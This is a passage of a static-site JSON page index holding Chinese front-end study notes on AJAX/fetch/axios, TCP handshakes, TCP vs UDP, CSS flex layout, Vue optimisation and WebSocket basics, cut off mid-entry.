{\n    return fetch(url).then(res => res.json())\n}\n\n\n\n# axios\n\naxios 是一个第三方库，随着 Vue 一起崛起。它和 jquery 一样（jquery 也有 ajax 功能）。\n\naxios 内部可以用 XMLHttpRequest 或者 fetch 实现。",
      "normalizedContent": "# ajax fetch axios 的区别\n\n * ajax 是一种技术称呼，不是具体的 api 和库\n * fetch 是新的异步请求 api ，可代替 xmlhttprequest\n * axios 是第三方库\n\n\n# ajax\n\najax （几个单词首字母，按规范应该大写） - asynchronous javascript and xml（异步的 javascript 和 xml）\n即使用 js 进行异步请求，是 web2.0 的技术基础，从 2005 年左右开始发起。\n所以，这里的 ajax 就是一个称呼，一个缩写。\n\n基于当时 js 规范，异步请求主要使用 xmlhttprequest 这个底层 api 。\n所以，\n\n\n# 面试题：请用 xmlhttprequest 实现 ajax\n\nfunction ajax(url, successfn) {\n    const xhr = new xmlhttprequest()\n    xhr.open(\"get\", url, false)\n    xhr.onreadystatechange = function () {\n        // 这里的函数异步执行，可参考之前 js 基础中的异步模块\n        if (xhr.readystate == 4) {\n            if (xhr.status == 200) {\n                successfn(xhr.responsetext)\n            }\n        }\n    }\n    xhr.send(null)\n}\n\n\n\n# fetch\n\nfetch 是一个原生 api ，它和 xmlhttprequest 一个级别。\n\nfetch 和 xmlhttprequest 的区别\n\n * 写法更加简洁\n * 原生支持 promise\n\n\n# 面试题：用 fetch 实现一个 ajax\n\nfunction ajax(url) {\n    return fetch(url).then(res => res.json())\n}\n\n\n\n# axios\n\naxios 是一个第三方库，随着 vue 一起崛起。它和 jquery 一样（jquery 也有 ajax 功能）。\n\naxios 内部可以用 xmlhttprequest 或者 fetch 实现。",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "TCP三次握手四次挥手",
      "frontmatter": {
        "title": "TCP三次握手四次挥手"
      },
      "regularPath": "/webstudy/HTTP/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.html",
      "relativePath": "webstudy/HTTP/TCP三次握手四次挥手.md",
      "key": "v-7198a9df",
      "path": "/webstudy/HTTP/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.html",
      "headers": [
        {
          "level": 2,
          "title": "建立连接",
          "slug": "建立连接",
          "normalizedTitle": "建立连接",
          "charIndex": 156
        },
        {
          "level": 2,
          "title": "三次握手",
          "slug": "三次握手",
          "normalizedTitle": "三次握手",
          "charIndex": 9
        },
        {
          "level": 2,
          "title": "四次挥手",
          "slug": "四次挥手",
          "normalizedTitle": "四次挥手",
          "charIndex": 14
        }
      ],
      "headersStr": "建立连接 三次握手 四次挥手",
      "content": "# TCP 连接 三次握手 四次挥手\n\n * 客户端发包，服务端接收。服务端确认：客户端已经请求结束\n * 服务端发包，客户端接收。客户端确认：服务端已经收到，我等待它关闭\n * 服务端发包：客户端接受。客户端确认：服务端已经发送完成，可以关闭\n * 客户端发包，服务端接收。服务端确认：可以关闭了\n\n\n\n\n# 建立连接\n\n客户端和服务端通过 HTTP 协议发送请求，并获取内容。\n\n在发送请求之前，需要先建立连接，确定目标机器处于可接受请求的状态。\n就例如，你要请快递员（第三方的）去张三家取一个东西，你必须先打电话问问他在不在家。这就是建立连接的过程。\n\nHTTP 协议是一个应用层的协议，它只规定了 req 和 res 的数据格式，如状态码、header、body 等。\n而建立网络连接需要更加底层的 TCP 协议。\n\n\n# 三次握手\n\n三次握手，即建立一次 TCP 连接时，客户端和服务端总共需要发送 3 个包。\n\n先举一个例子。还是你要派人去张三家取一个东西，现在你要发短信（不是打电话）“建立连接”，至少需要 3 个步骤，缺一不可。\n\n * 你：在家吗？\n * 张三：在家\n * 你：好，这就过去（然后你指派人上门，张三准备迎接）\n\n过程\n\n * 客户端发包，服务端收到。服务端确认：客户端的发送能力是正常的。\n * 服务端发包，客户端收到。客户端确认：服务端的接收能力是正常的。\n * 客户端发包，服务端收到。服务端确认：客户端即将给我发送数据，我要准备接收。\n\n建立连接完成，然后就开始发送数据，通讯。\n\n\n# 四次挥手\n\n握手，是建立连接。挥手，就是告别，就是关闭连接。\n\n还是之前的例子。取东西，不一定一次就取完，可能要来回很多次。而且，也不一定全部由你主动发起，过程中张三也可能会主动派人给你发送。\n即，你在 chrome 中看到的是一次 http 请求，其实背后可能需要好几次网络传输，只不过浏览器给合并起来了。\n\n好了，取东西完毕了，你要发短信“关闭连接”，告诉张三可以关门了，需要 4 个步骤。\n【注意】这里你需要等着确认张三关门，才算是完全关闭连接，不能你说一声就不管了。跟日常生活不一样。\n\n * 你：完事儿了\n * 张三：好的 （此时可能还要继续给你发送，你也得继续接收。直到张三发送完）\n * 张三：我发送完毕，准备关门了\n * 你：好，关门吧 （然后你可以走了，张三可以关门了，连接结束）",
      "normalizedContent": "# tcp 连接 三次握手 四次挥手\n\n * 客户端发包，服务端接收。服务端确认：客户端已经请求结束\n * 服务端发包，客户端接收。客户端确认：服务端已经收到，我等待它关闭\n * 服务端发包：客户端接受。客户端确认：服务端已经发送完成，可以关闭\n * 客户端发包，服务端接收。服务端确认：可以关闭了\n\n\n\n\n# 建立连接\n\n客户端和服务端通过 http 协议发送请求，并获取内容。\n\n在发送请求之前，需要先建立连接，确定目标机器处于可接受请求的状态。\n就例如，你要请快递员（第三方的）去张三家取一个东西，你必须先打电话问问他在不在家。这就是建立连接的过程。\n\nhttp 协议是一个应用层的协议，它只规定了 req 和 res 的数据格式，如状态码、header、body 等。\n而建立网络连接需要更加底层的 tcp 协议。\n\n\n# 三次握手\n\n三次握手，即建立一次 tcp 连接时，客户端和服务端总共需要发送 3 个包。\n\n先举一个例子。还是你要派人去张三家取一个东西，现在你要发短信（不是打电话）“建立连接”，至少需要 3 个步骤，缺一不可。\n\n * 你：在家吗？\n * 张三：在家\n * 你：好，这就过去（然后你指派人上门，张三准备迎接）\n\n过程\n\n * 客户端发包，服务端收到。服务端确认：客户端的发送能力是正常的。\n * 服务端发包，客户端收到。客户端确认：服务端的接收能力是正常的。\n * 客户端发包，服务端收到。服务端确认：客户端即将给我发送数据，我要准备接收。\n\n建立连接完成，然后就开始发送数据，通讯。\n\n\n# 四次挥手\n\n握手，是建立连接。挥手，就是告别，就是关闭连接。\n\n还是之前的例子。取东西，不一定一次就取完，可能要来回很多次。而且，也不一定全部由你主动发起，过程中张三也可能会主动派人给你发送。\n即，你在 chrome 中看到的是一次 http 请求，其实背后可能需要好几次网络传输，只不过浏览器给合并起来了。\n\n好了，取东西完毕了，你要发短信“关闭连接”，告诉张三可以关门了，需要 4 个步骤。\n【注意】这里你需要等着确认张三关门，才算是完全关闭连接，不能你说一声就不管了。跟日常生活不一样。\n\n * 你：完事儿了\n * 张三：好的 （此时可能还要继续给你发送，你也得继续接收。直到张三发送完）\n * 张三：我发送完毕，准备关门了\n * 你：好，关门吧 （然后你可以走了，张三可以关门了，连接结束）",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "TCP和UDP",
      "frontmatter": {
        "title": "TCP和UDP"
      },
      "regularPath": "/webstudy/HTTP/TCP%E5%92%8CUDP.html",
      "relativePath": "webstudy/HTTP/TCP和UDP.md",
      "key": "v-d45d5bf2",
      "path": "/webstudy/HTTP/TCP%E5%92%8CUDP.html",
      "headers": [
        {
          "level": 3,
          "title": "TCP协议和UDP协议",
          "slug": "tcp协议和udp协议",
          "normalizedTitle": "tcp协议和udp协议",
          "charIndex": 14
        },
        {
          "level": 3,
          "title": "网络协议",
          "slug": "网络协议",
          "normalizedTitle": "网络协议",
          "charIndex": 169
        },
        {
          "level": 3,
          "title": "UDP 的特点",
          "slug": "udp-的特点",
          "normalizedTitle": "udp 的特点",
          "charIndex": 238
        },
        {
          "level": 3,
          "title": "总结",
          "slug": "总结",
          "normalizedTitle": "总结",
          "charIndex": 454
        },
        {
          "level": 2,
          "title": "连环问：http 1.0 1.1 2.0 区别",
          "slug": "连环问-http-1-0-1-1-2-0-区别",
          "normalizedTitle": "连环问：http 1.0 1.1 2.0 区别",
          "charIndex": 525
        }
      ],
      "headersStr": "TCP协议和UDP协议 网络协议 UDP 的特点 总结 连环问：http 1.0 1.1 2.0 区别",
      "content": "# TCP和UDP\n\n\n# TCP协议和UDP协议\n\nTCP 是一种面向有连接的传输层协议，能够对自己提供的连接实施控制。适用于要求可靠传输的应用，例如文件传输。面向字节流，传输慢\n\nUDP 是一种面向无连接的传输层协议，不会对自己提供的连接实施控制。适用于实时应用，例如：IP电话、视频会议、直播等。，以报文的方式传输，效率高\n\n\n# 网络协议\n\n * HTTP 在应用层，直接被程序使用，http1/2基于TCP传输协议\n * TCP 和 UDP 在传输层，底层\n\n\n# UDP 的特点\n\nUDP 是一种无连接的、不可靠的传输层协议。而 TCP 需要连接、断开连接，参考“三次握手、四次挥手”。\n\n不需要连接，所以 UDP 的效率比 TCP 高。\n\n虽然 UDP 从协议层是不稳定的，但随着现代网络硬件环境的提升，也能保证绝大部分情况下的稳定性。所以，UDP 一直处于被发展的趋势。\n\n例如视频会议、语音通话这些允许中段、不完全保证持续连接的场景，又需要较高的传输效率，就很适合 UDP 协议。\n\n\n# 总结\n\n * HTTP 在应用层，而 UDP 和 TCP 在传输层\n * HTTP 是有连接的、可靠的，UDP 是无连接的、不可靠的\n\n\n# 连环问：http 1.0 1.1 2.0 区别\n\nhttp 1.0 最基础的 http 协议\n\nhttp 1.1\n\n * 引入更多的缓存策略，如 cache-control E-tag\n * 长链接，默认开启 Connection: keep-alive ，多次 http 请求减少了 TCP 连接次数\n * 断点续传，状态吗 206\n * 增加新的 method PUT DELETE 等，可以设计 Restful API\n\nhttp2.0\n\n * header 压缩，以减少体积\n * 多路复用，一个 TCP 连接中可以多个 http 并行请求。拼接资源（如雪碧图、多 js 拼接一个）将变的多余\n * 服务器端推送",
      "normalizedContent": "# tcp和udp\n\n\n# tcp协议和udp协议\n\ntcp 是一种面向有连接的传输层协议，能够对自己提供的连接实施控制。适用于要求可靠传输的应用，例如文件传输。面向字节流，传输慢\n\nudp 是一种面向无连接的传输层协议，不会对自己提供的连接实施控制。适用于实时应用，例如：ip电话、视频会议、直播等。，以报文的方式传输，效率高\n\n\n# 网络协议\n\n * http 在应用层，直接被程序使用，http1/2基于tcp传输协议\n * tcp 和 udp 在传输层，底层\n\n\n# udp 的特点\n\nudp 是一种无连接的、不可靠的传输层协议。而 tcp 需要连接、断开连接，参考“三次握手、四次挥手”。\n\n不需要连接，所以 udp 的效率比 tcp 高。\n\n虽然 udp 从协议层是不稳定的，但随着现代网络硬件环境的提升，也能保证绝大部分情况下的稳定性。所以，udp 一直处于被发展的趋势。\n\n例如视频会议、语音通话这些允许中段、不完全保证持续连接的场景，又需要较高的传输效率，就很适合 udp 协议。\n\n\n# 总结\n\n * http 在应用层，而 udp 和 tcp 在传输层\n * http 是有连接的、可靠的，udp 是无连接的、不可靠的\n\n\n# 连环问：http 1.0 1.1 2.0 区别\n\nhttp 1.0 最基础的 http 协议\n\nhttp 1.1\n\n * 引入更多的缓存策略，如 cache-control e-tag\n * 长链接，默认开启 connection: keep-alive ，多次 http 请求减少了 tcp 连接次数\n * 断点续传，状态吗 206\n * 增加新的 method put delete 等，可以设计 restful api\n\nhttp2.0\n\n * header 压缩，以减少体积\n * 多路复用，一个 tcp 连接中可以多个 http 并行请求。拼接资源（如雪碧图、多 js 拼接一个）将变的多余\n * 服务器端推送",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "flex布局",
      "frontmatter": {
        "title": "flex布局"
      },
      "regularPath": "/webstudy/CSS/flex.html",
      "relativePath": "webstudy/CSS/flex.md",
      "key": "v-1f9cab6c",
      "path": "/webstudy/CSS/flex.html",
      "headers": [
        {
          "level": 3,
          "title": "一些属性",
          "slug": "一些属性",
          "normalizedTitle": "一些属性",
          "charIndex": 13
        },
        {
          "level": 3,
          "title": "骰子",
          "slug": "骰子",
          "normalizedTitle": "骰子",
          "charIndex": 525
        },
        {
          "level": 3,
          "title": "自定义布局",
          "slug": "自定义布局",
          "normalizedTitle": "自定义布局",
          "charIndex": 1432
        },
        {
          "level": 3,
          "title": "中间自适应",
          "slug": "中间自适应",
          "normalizedTitle": "中间自适应",
          "charIndex": 2300
        }
      ],
      "headersStr": "一些属性 骰子 自定义布局 中间自适应",
      "content": "# flex布局\n\n\n# 一些属性\n\n# flex-grow、flex-shrink、flex-basis三个属性\n\n这三个属性都是在子元素上设置的\n\n * flex-basis用来设置元素的宽度，其实，width也可以设置宽度。如果元素上同时设置了width和flex-basis，那么width 的值就会被flex-basis覆盖掉\n * flex-grow该属性用来设置当父元素的宽度大于所有子元素的宽度的和时（即父元素会有剩余空间），子元素如何分配父元素的剩余空间。 flex-grow的默认值为0，意思是该元素不索取父元素的剩余空间，如果值大于0，表示索取。值越大，索取的越厉害\n * flex-shrink该属性用来设置，当父元素的宽度小于所有子元素的宽度的和时（即子元素会超出父元素），子元素如何缩小自己的宽度的。 flex-shrink的默认值为1，当父元素的宽度小于所有子元素的宽度的和时，子元素的宽度会减小。值越大，减小的越厉害。如果值为0，表示不减小\n\n# flex:1\n\n * flex: 1的值是 flex-grow: 1; flex-shrink: 1; flex-basis: 0%;元素占据剩余宽度的 1 份\n\n\n# 骰子\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>BFC</title>\n    <style>\n    .main {\n        width: 500px;\n        height: 500px;\n        background-color: #fff;\n        border: 1px solid #333;\n        /* box-sizing: border-box; */\n        display: flex;\n        justify-content: space-between;\n    }\n    .box {\n        width: 150px;\n        height: 150px;\n        border-radius: 50%;\n        background-color: lime;\n    }\n    .box2 {\n        align-self: center;\n    }\n    .box3 {\n        align-self: flex-end;\n    }\n    </style>\n</head>\n<body>\n    <div class=\"main\">\n        <div class=\"box box1\"></div>\n        <div class=\"box box2\"></div>\n        <div class=\"box box3\"></div>\n    </div>\n    <script>\n    </script>\n</body>\n</html>\n\n\n\n\n\n\n# 自定义布局\n\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>flex布局</title>\n    <style>\n      .main {\n        width: 300px;\n        height: 300px;\n        background-color: lime;\n        display: flex;\n        justify-content: space-around;\n        flex-wrap: wrap;\n        align-content: space-around;\n      }\n      .box {\n        width: 80px;\n        height: 80px;\n        background-color: orange;\n      }\n    </style>\n  </head>\n  <body>\n    <div class=\"main\">\n      <div class=\"box\"></div>\n      <div class=\"box\"></div>\n      <div class=\"box\"></div>\n      <div class=\"box\"></div>\n      <div class=\"box\"></div>\n      <div class=\"box\"></div>\n    </div>\n    <script></script>\n  </body>\n</html>\n\n\n\n\n\n\n# 中间自适应\n\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>flex布局</title>\n    <style>\n      .main {\n        width: 100%;\n        height: 300px;\n        background-color: #fff;\n        display: flex;\n        justify-content: space-around;\n      }\n      div:not(.main) {\n        height: 300px;\n        width: 100px;\n      }\n      .first {\n        width: 200px;\n        background-color: red;\n      }\n      .second {\n        /* 属性用于设置或检索弹性盒子的扩展比率 */\n        flex-grow: 1; \n        background-color: limegreen;\n      }\n      .third {\n        width: 200px;\n        background-color: orange;\n      }\n    </style>\n  </head>\n  <body>\n    <div class=\"main\">\n      <div class=\"first\">1</div>\n      <div class=\"second\">2</div>\n      <div class=\"third\">3</div>\n    </div>\n    <script></script>\n  </body>\n</html>\n\n\n",
      "normalizedContent": "# flex布局\n\n\n# 一些属性\n\n# flex-grow、flex-shrink、flex-basis三个属性\n\n这三个属性都是在子元素上设置的\n\n * flex-basis用来设置元素的宽度，其实，width也可以设置宽度。如果元素上同时设置了width和flex-basis，那么width 的值就会被flex-basis覆盖掉\n * flex-grow该属性用来设置当父元素的宽度大于所有子元素的宽度的和时（即父元素会有剩余空间），子元素如何分配父元素的剩余空间。 flex-grow的默认值为0，意思是该元素不索取父元素的剩余空间，如果值大于0，表示索取。值越大，索取的越厉害\n * flex-shrink该属性用来设置，当父元素的宽度小于所有子元素的宽度的和时（即子元素会超出父元素），子元素如何缩小自己的宽度的。 flex-shrink的默认值为1，当父元素的宽度小于所有子元素的宽度的和时，子元素的宽度会减小。值越大，减小的越厉害。如果值为0，表示不减小\n\n# flex:1\n\n * flex: 1的值是 flex-grow: 1; flex-shrink: 1; flex-basis: 0%;元素占据剩余宽度的 1 份\n\n\n# 骰子\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>bfc</title>\n    <style>\n    .main {\n        width: 500px;\n        height: 500px;\n        background-color: #fff;\n        border: 1px solid #333;\n        /* box-sizing: border-box; */\n        display: flex;\n        justify-content: space-between;\n    }\n    .box {\n        width: 150px;\n        height: 150px;\n        border-radius: 50%;\n        background-color: lime;\n    }\n    .box2 {\n        align-self: center;\n    }\n    .box3 {\n        align-self: flex-end;\n    }\n    </style>\n</head>\n<body>\n    <div class=\"main\">\n        <div class=\"box box1\"></div>\n        <div class=\"box box2\"></div>\n        <div class=\"box box3\"></div>\n    </div>\n    <script>\n    </script>\n</body>\n</html>\n\n\n\n\n\n\n# 自定义布局\n\n<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\" />\n    <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>flex布局</title>\n    <style>\n      .main {\n        width: 300px;\n        height: 300px;\n        background-color: lime;\n        display: flex;\n        justify-content: space-around;\n        flex-wrap: wrap;\n        align-content: space-around;\n      }\n      .box {\n        width: 80px;\n        height: 80px;\n        background-color: orange;\n      }\n    </style>\n  </head>\n  <body>\n    <div class=\"main\">\n      <div class=\"box\"></div>\n      <div class=\"box\"></div>\n      <div class=\"box\"></div>\n      <div class=\"box\"></div>\n      <div class=\"box\"></div>\n      <div class=\"box\"></div>\n    </div>\n    <script></script>\n  </body>\n</html>\n\n\n\n\n\n\n# 中间自适应\n\n<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\" />\n    <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>flex布局</title>\n    <style>\n      .main {\n        width: 100%;\n        height: 300px;\n        background-color: #fff;\n        display: flex;\n        justify-content: space-around;\n      }\n      div:not(.main) {\n        height: 300px;\n        width: 100px;\n      }\n      .first {\n        width: 200px;\n        background-color: red;\n      }\n      .second {\n        /* 属性用于设置或检索弹性盒子的扩展比率 */\n        flex-grow: 1; \n        background-color: limegreen;\n      }\n      .third {\n        width: 200px;\n        background-color: orange;\n      }\n    </style>\n  </head>\n  <body>\n    <div class=\"main\">\n      <div class=\"first\">1</div>\n      <div class=\"second\">2</div>\n      <div class=\"third\">3</div>\n    </div>\n    <script></script>\n  </body>\n</html>\n\n\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "Vue优化",
      "frontmatter": {
        "title": "Vue优化"
      },
      "regularPath": "/webstudy/Experience/Vue%E4%BC%98%E5%8C%96.html",
      "relativePath": "webstudy/Experience/Vue优化.md",
      "key": "v-4554a115",
      "path": "/webstudy/Experience/Vue%E4%BC%98%E5%8C%96.html",
      "headers": [
        {
          "level": 2,
          "title": "1、v-if 和 v-show",
          "slug": "_1、v-if-和-v-show",
          "normalizedTitle": "1、v-if 和 v-show",
          "charIndex": 12
        },
        {
          "level": 2,
          "title": "2、v-for 使用 key",
          "slug": "_2、v-for-使用-key",
          "normalizedTitle": "2、v-for 使用 key",
          "charIndex": 160
        },
        {
          "level": 2,
          "title": "3、使用computed缓存",
          "slug": "_3、使用computed缓存",
          "normalizedTitle": "3、使用computed缓存",
          "charIndex": 243
        },
        {
          "level": 2,
          "title": "4、使用keep-alive缓存组件",
          "slug": "_4、使用keep-alive缓存组件",
          "normalizedTitle": "4、使用keep-alive缓存组件",
          "charIndex": 544
        },
        {
          "level": 2,
          "title": "5、组件的按需加载",
          "slug": "_5、组件的按需加载",
          "normalizedTitle": "5、组件的按需加载",
          "charIndex": 693
        },
        {
          "level": 2,
          "title": "6、路由懒加载",
          "slug": "_6、路由懒加载",
          "normalizedTitle": "6、路由懒加载",
          "charIndex": 864
        },
        {
          "level": 2,
          "title": "7、SSR",
          "slug": "_7、ssr",
          "normalizedTitle": "7、ssr",
          "charIndex": 1138
        },
        {
          "level": 2,
          "title": "Vue遇到的坑",
          "slug": "vue遇到的坑",
          "normalizedTitle": "vue遇到的坑",
          "charIndex": 1249
        }
      ],
      "headersStr": "1、v-if 和 v-show 2、v-for 使用 key 3、使用computed缓存 4、使用keep-alive缓存组件 5、组件的按需加载 6、路由懒加载 7、SSR Vue遇到的坑",
      "content": "# Vue优化\n\n\n# 1、v-if 和 v-show\n\n * v-if 组件销毁/重建，v-show 组件隐藏（display）\n\n使用场景\n\n * 多数情况v-if，普通组件的销毁、渲染不会造成性能问题\n * 如果组件创建时需要大量计算，或者大量渲染（如复杂的编辑器、表单、地图等），可以考虑 v-show\n\n\n# 2、v-for 使用 key\n\n * vue默认是就地复用策略，，使用key 可以优化内部的 diff 算法\n * 遍历数组时 key 不要使用 index\n\n\n# 3、使用computed缓存\n\ncomputed 可以缓存计算结果，data 不变则缓存不失效\n\nexport default {\n    data() {\n        return {\n            msgList: [ ... ] // 消息列表\n        }\n    },\n    computed: {\n        // 未读消息的数量\n        unreadCount() {\n            return this.msgList.filter(m => m.read === false).length\n        }\n    }\n}\n\n\n\n# 4、使用keep-alive缓存组件\n\n<keep-alive> 可以缓存子组件，只创建一次，注意搭配 activated 和 deactivated 生命周期钩子使用。\n\n\n使用场景\n\n * 局部频繁切换的组件，如 tabs\n * 注意：<keep-alive>缓存会占用内存，慎重使用\n\n\n# 5、组件的按需加载\n\n对于体积大的组件（如编辑器、表单、地图等）可以使用异步组件\n\n * 拆包，需要时异步加载，不需要时不加载\n * 减少 main 包的体积，页面首次加载更快\n\nvue3 使用 defineAsyncComponent 加载异步组件，代码参考 components/AsyncComponent/index.vue\n\n\n# 6、路由懒加载\n\n对于一些补偿访问的路由，或者组件提交比较大的路由，可以使用路由懒加载。\n\nconst routes = [\n  {\n    path: '/',\n    name: 'Home',\n    component: Home\n  },\n  {\n    path: '/about',\n    name: 'About',\n    // 路由懒加载\n    component: () => import(/* webpackChunkName: \"about\" */ '../views/About.vue')\n  }\n]\n\n\n\n# 7、SSR\n\nSSR 让网页访问速度更快，对 SEO 友好。\n\n但 SSR 使用和调试成本高，不可乱用。例如，一个低代码项目（在线制作 H5 网页），toB 部分不可用 SSR ， toC 部分适合用 SSR 。\n\n\n# Vue遇到的坑\n\n全局事件、自定义事件要在组件销毁时解除绑定\n\n * 内存泄漏风险\n * 全局事件（如 window.resize）不解除，则会继续监听，而且组件再次创建时会重复绑定\n\nVue2.x 中，无法监听 data 属性的新增和删除，以及数组的部分修改 —— Vue3 不会有这个问题\n\n * 新增 data 属性，需要用 Vue.set\n * 删除 data 属性，需要用 Vue.delete\n * 修改数组某一元素，不能 arr[index] = value ，要使用 arr.splice API 方式\n\n路由切换时，页面会 scroll 到顶部。例如，在一个新闻列表页下滑到一定位置，点击进入详情页，在返回列表页，此时会 scroll 到顶部，并重新渲染列表页。所有的 SPA 都会有这个问题，并不仅仅是 Vue 。\n\n * 在列表页缓存数据和 scrollTop\n * 返回列表页时（用 Vue-router 导航守卫，判断 from），使用缓存数据渲染页面，然后 scrollTo(scrollTop)",
      "normalizedContent": "# vue优化\n\n\n# 1、v-if 和 v-show\n\n * v-if 组件销毁/重建，v-show 组件隐藏（display）\n\n使用场景\n\n * 多数情况v-if，普通组件的销毁、渲染不会造成性能问题\n * 如果组件创建时需要大量计算，或者大量渲染（如复杂的编辑器、表单、地图等），可以考虑 v-show\n\n\n# 2、v-for 使用 key\n\n * vue默认是就地复用策略，，使用key 可以优化内部的 diff 算法\n * 遍历数组时 key 不要使用 index\n\n\n# 3、使用computed缓存\n\ncomputed 可以缓存计算结果，data 不变则缓存不失效\n\nexport default {\n    data() {\n        return {\n            msglist: [ ... ] // 消息列表\n        }\n    },\n    computed: {\n        // 未读消息的数量\n        unreadcount() {\n            return this.msglist.filter(m => m.read === false).length\n        }\n    }\n}\n\n\n\n# 4、使用keep-alive缓存组件\n\n<keep-alive> 可以缓存子组件，只创建一次，注意搭配 activated 和 deactivated 生命周期钩子使用。\n\n\n使用场景\n\n * 局部频繁切换的组件，如 tabs\n * 注意：<keep-alive>缓存会占用内存，慎重使用\n\n\n# 5、组件的按需加载\n\n对于体积大的组件（如编辑器、表单、地图等）可以使用异步组件\n\n * 拆包，需要时异步加载，不需要时不加载\n * 减少 main 包的体积，页面首次加载更快\n\nvue3 使用 defineasynccomponent 加载异步组件，代码参考 components/asynccomponent/index.vue\n\n\n# 6、路由懒加载\n\n对于一些补偿访问的路由，或者组件提交比较大的路由，可以使用路由懒加载。\n\nconst routes = [\n  {\n    path: '/',\n    name: 'home',\n    component: home\n  },\n  {\n    path: '/about',\n    name: 'about',\n    // 路由懒加载\n    component: () => import(/* webpackchunkname: \"about\" */ '../views/about.vue')\n  }\n]\n\n\n\n# 7、ssr\n\nssr 让网页访问速度更快，对 seo 友好。\n\n但 ssr 使用和调试成本高，不可乱用。例如，一个低代码项目（在线制作 h5 网页），tob 部分不可用 ssr ， toc 部分适合用 ssr 。\n\n\n# vue遇到的坑\n\n全局事件、自定义事件要在组件销毁时解除绑定\n\n * 内存泄漏风险\n * 全局事件（如 window.resize）不解除，则会继续监听，而且组件再次创建时会重复绑定\n\nvue2.x 中，无法监听 data 属性的新增和删除，以及数组的部分修改 —— vue3 不会有这个问题\n\n * 新增 data 属性，需要用 vue.set\n * 删除 data 属性，需要用 vue.delete\n * 修改数组某一元素，不能 arr[index] = value ，要使用 arr.splice api 方式\n\n路由切换时，页面会 scroll 到顶部。例如，在一个新闻列表页下滑到一定位置，点击进入详情页，在返回列表页，此时会 scroll 到顶部，并重新渲染列表页。所有的 spa 都会有这个问题，并不仅仅是 vue 。\n\n * 在列表页缓存数据和 scrolltop\n * 返回列表页时（用 vue-router 导航守卫，判断 from），使用缓存数据渲染页面，然后 scrollto(scrolltop)",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "webSocket",
      "frontmatter": {
        "title": "webSocket"
      },
      "regularPath": "/webstudy/HTTP/webSocket.html",
      "relativePath": "webstudy/HTTP/webSocket.md",
      "key": "v-3310d7e8",
      "path": "/webstudy/HTTP/webSocket.html",
      "headers": [
        {
          "level": 3,
          "title": "简介",
          "slug": "简介",
          "normalizedTitle": "简介",
          "charIndex": 16
        },
        {
          "level": 3,
          "title": "webSocket 建立连接",
          "slug": "websocket-建立连接",
          "normalizedTitle": "websocket 建立连接",
          "charIndex": 185
        },
        {
          "level": 3,
          "title": "webSocket 和 http 区别",
          "slug": "websocket-和-http-区别",
          "normalizedTitle": "websocket 和 http 区别",
          "charIndex": 261
        },
        {
          "level": 3,
          "title": "wss",
          "slug": "wss",
          "normalizedTitle": "wss",
          "charIndex": 441
        }
      ],
      "headersStr": "简介 webSocket 建立连接 webSocket 和 http 区别 wss",
      "content": "# webSocket\n\n\n# 简介\n\n * WebSocket是一种在单个TCP连接上进行全双工通信的协议\n * Websocket 通过HTTP/1.1 协议的101状态码进行握手\n * webSocket 和 http 都是应用层，支持端对端的通讯。可以由服务端发起，也可以由客户端发起。\n   \n\n常见的应用场景：消息通知，直播讨论区，聊天室，协同编辑\n\n\n# webSocket 建立连接\n\n会先发起一个 http 请求，根服务端建立连接。连接成功之后再升级为 webSocket 协议，然后再通讯\n\n\n\n\n# webSocket 和 http 区别\n\n * 协议名称不同——websccoket是 ws 和 http是http\n * http 一般只能浏览器发起请求，webSocket 可以双端发起请求\n * webSocket 无跨域限制\n * webSocket 通过 send 和 onmessage 进行通讯，http 通过 req 和 res 通讯\n\n\n# wss\n\nws 可以升级为 wss 协议，像 http 升级到 https 一样，增加 SSL 安全协议。",
      "normalizedContent": "# websocket\n\n\n# 简介\n\n * websocket是一种在单个tcp连接上进行全双工通信的协议\n * websocket 通过http/1.1 协议的101状态码进行握手\n * websocket 和 http 都是应用层，支持端对端的通讯。可以由服务端发起，也可以由客户端发起。\n   \n\n常见的应用场景：消息通知，直播讨论区，聊天室，协同编辑\n\n\n# websocket 建立连接\n\n会先发起一个 http 请求，根服务端建立连接。连接成功之后再升级为 websocket 协议，然后再通讯\n\n\n\n\n# websocket 和 http 区别\n\n * 协议名称不同——websccoket是 ws 和 http是http\n * http 一般只能浏览器发起请求，websocket 可以双端发起请求\n * websocket 无跨域限制\n * websocket 通过 send 和 onmessage 进行通讯，http 通过 req 和 res 通讯\n\n\n# wss\n\nws 可以升级为 wss 协议，像 http 升级到 https 一样，增加 ssl 安全协议。",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "token和cookie",
      "frontmatter": {
        "title": "token和cookie"
      },
      "regularPath": "/webstudy/HTTP/token%E5%92%8Ccookie.html",
      "relativePath": "webstudy/HTTP/token和cookie.md",
      "key": "v-5ae5e296",
